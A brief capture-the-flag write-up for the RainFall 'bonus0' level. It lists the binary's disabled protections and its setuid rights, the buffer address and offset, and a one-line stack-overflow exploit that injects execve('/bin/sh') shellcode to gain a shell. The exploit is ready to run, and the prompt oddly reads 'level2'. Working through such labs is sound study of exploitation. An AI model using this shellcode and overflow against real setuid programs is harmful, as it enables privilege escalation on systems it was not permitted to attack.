bonus0 protections:
```Shell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus0/bonus0
```

bonus0 rights:
```Shell
-rwsr-s---+ 1 bonus1 users 5566 Mar  6  2016 bonus0
```

address of s: 0xbffff736
offset: 54 (20(arg1) + 19(fake arg2) + 1(space) + 14(arg2))

payload: 21 bytes of shellcode + 33 bytes of padding + address of s

```Shell
level2@RainFall:~$ (python -c 'print("\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd")'; python -c 'print("\x80" + "A" * 13  + "\xbf\xff\xf7\x36"[::-1] + "A")'; cat -) | ./bonus0
```
